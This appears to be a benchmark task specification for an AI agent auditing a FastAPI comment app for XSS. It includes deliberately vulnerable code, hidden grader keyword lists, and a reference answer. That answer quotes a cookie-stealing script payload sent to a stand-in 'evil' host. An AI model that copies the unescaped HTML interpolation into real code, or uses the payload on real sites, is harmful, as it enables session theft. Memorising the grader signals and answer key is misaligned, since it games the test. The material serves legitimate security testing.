# TASK-04 — find-stored-xss-comments

| Field | Value |
|---|---|
| Category | OWASP Top 10:2025 — **A03 Injection** (stored XSS, CWE-79) |
| Difficulty | **easy** |
| Deliverable | `/app/security_report.json` (audit report; **no code changes**) |
| Pattern cloned from | `local_task/find-sqli-login` (audit → findings[] JSON) |

## 1. Suggested `task.toml`

```toml
schema_version = "1.2"

[task]
name = "local/find-stored-xss-comments"
description = "Audit a FastAPI guestbook-style app for cross-site scripting and report findings in machine-readable JSON."
authors = []
keywords = []

[metadata]
difficulty = "easy"
category = "security"
tags = ["local", "xss", "owasp-a03", "cwe-79", "fastapi", "audit", "report"]

[verifier]
timeout_sec = 120.0

[agent]
timeout_sec = 600.0

[environment]
build_timeout_sec = 600.0
cpus = 2
memory_mb = 4096
storage_mb = 10240
gpus = 0
allow_internet = true
mcp_servers = []

[verifier.env]

[environment.env]

[solution.env]
```

## 2. `instruction.md` (full text, verbatim)

````markdown
You are working in `/app`. The application is a FastAPI service with an HTML comment wall.

Perform a security audit of the application. Do not modify application code.

Your deliverable is a machine-readable JSON report at:

`/app/security_report.json`

The report must be valid JSON with this top-level shape:

```json
{
  "findings": [
    {
      "title": "Short finding title",
      "severity": "critical|high|medium|low|informational",
      "category": "Vulnerability category",
      "location": "Affected file, function, endpoint, or component",
      "evidence": "Concrete code or behavior that demonstrates the issue",
      "impact": "Security impact",
      "recommendation": "Recommended remediation"
    }
  ]
}
```

Include enough detail for each finding to be useful to an engineer triaging a bug
bounty report.
````

## 3. `environment/` composition

No database — in-memory list; needs `python-multipart` for Form parsing.

| Path | Contents |
|---|---|
| `environment/Dockerfile`, `environment/entrypoint.sh` | same pattern as `find-sqli-login` (no postgres step) |
| `environment/app/pyproject.toml` | deps: fastapi, uvicorn[standard], httpx, pytest, python-multipart>=0.0.9 |
| `environment/app/AGENTS.md` | same discipline doc |
| `environment/app/main.py` | FastAPI app, includes `routers.comments.router`, `GET /healthz` |
| `environment/app/routers/__init__.py` | empty |
| `environment/app/routers/comments.py` | **vulnerable** — verbatim below |
| `environment/app/routers/profile.py` | second, reflected XSS sink: `GET /profile/{username}` returns `HTMLResponse(f"<h1>Profile: {username}</h1>")` |
| `environment/app/tests/test_api.py` | visible regression: post comment → list comments contains the author name; healthz 200 |

`environment/app/routers/comments.py` (verbatim):

```python
from fastapi import APIRouter, Form
from fastapi.responses import HTMLResponse

router = APIRouter(tags=["comments"])

_COMMENTS: list[dict] = []


@router.get("/comments", response_class=HTMLResponse)
async def list_comments():
    items = "".join(
        f"<li><b>{c['author']}</b>: {c['body']}</li>"  # VULNERABLE: unescaped interpolation (stored XSS)
        for c in _COMMENTS
    )
    return HTMLResponse(f"<html><body><h1>Comments</h1><ul>{items}</ul></body></html>")


@router.post("/comments")
async def add_comment(author: str = Form(...), body: str = Form(...)):
    _COMMENTS.append({"author": author, "body": body})
    return HTMLResponse("<html><body>Comment added. <a href='/comments'>View comments</a></body></html>")
```

## 4. Verifier (`tests/`)

`tests/test.sh`: start uvicorn from `/app` (wait for `/healthz`), run `pytest /tests`,
write 0/1 to `/logs/verifier/reward.txt`.

`tests/test_security_report.py` (hidden verifier — signal style of `find-sqli-login`):

```python
ssrf-like grouping:
xss_signals = ["xss", "cross-site scripting", "cross site scripting", "cwe-79"]
location_signals = ["comments", "/comments", "comments.py", "comment"]
detail_signals = [
    "<script>", "stored", "escape", "html escape", "autoescape", "htmlresponse",
    "f-string", "interpolation", "markup", "untrusted",
]
# assert: >= 1 finding whose flattened lowercased text matches at least one
# signal in EACH of the three lists.

def test_app_code_unmodified():
    # sha256 of pristine comments.py / profile.py pinned at packaging time
    ...
```

Additional hidden check: a second test
`test_report_mentions_stored_persistence` requires that at least one finding mentioning
XSS also contains the word `stored` **or** describes persistence in impact/evidence
(needle list: `stored`, `persist`, `every visitor`, `other users`).

**Exact grading semantics:** binary 0/1 — report exists + valid JSON + one finding matching all
three signal groups + one XSS finding noting persistence + code byte-identical to pristine.

## 5. Reference solution (agent steps ≈ `solution/solve.sh`)

```bash
#!/usr/bin/env bash
set -euo pipefail
python3 - <<'PYEOF'
import json, pathlib
report = {
  "findings": [
    {
      "title": "Stored XSS in comment wall (CWE-79)",
      "severity": "high",
      "category": "Cross-Site Scripting (XSS)",
      "location": "app/routers/comments.py: list_comments, GET /comments",
      "evidence": "Comment author and body are interpolated into HTML with an f-string and returned via HTMLResponse without escaping: f\"<li><b>{c['author']}</b>: {c['body']}</li>\". A POST /comments with body=<script>document.location='https://evil/?c='+document.cookie</script> is stored in memory and executed for every visitor of GET /comments.",
      "impact": "Stored XSS: session hijacking and credential theft for every user viewing the comment wall; persists for the lifetime of the service.",
      "recommendation": "Escape with html.escape() or render via Jinja2 with autoescape enabled; add Content-Security-Policy; sanitize input on ingestion."
    },
    {
      "title": "Reflected XSS in /profile/{username}",
      "severity": "medium",
      "category": "Cross-Site Scripting (XSS)",
      "location": "app/routers/profile.py: get_profile",
      "evidence": "Path parameter username is interpolated unescaped into an HTMLResponse.",
      "impact": "Attacker-crafted links execute script in the victim's browser context.",
      "recommendation": "Escape the value or return JSON; validate username format."
    }
  ]
}
pathlib.Path("/app/security_report.json").write_text(json.dumps(report, indent=2))
PYEOF
python3 -c "import json; json.load(open('/app/security_report.json'))"
```

## 6. Expected agent difficulty profile

- **Steps:** ~6–10 tool calls (ls, read 2 files, write JSON, validate). Deliberately the
  "easy audit" tier alongside `find-sqli-login`.
- **Small-model failure modes:**
  - Reports only the reflected `/profile` XSS and never mentions `/comments` → location signal fails.
  - Forgets the word `stored`/persistence in the /comments finding → second hidden test fails.
  - JSON escaping of the `<script>` payload inside `evidence` (must survive `json.dumps` — it does,
    but hand-written JSON may break).
  - Modifies code despite the prohibition → sha256 check fails.
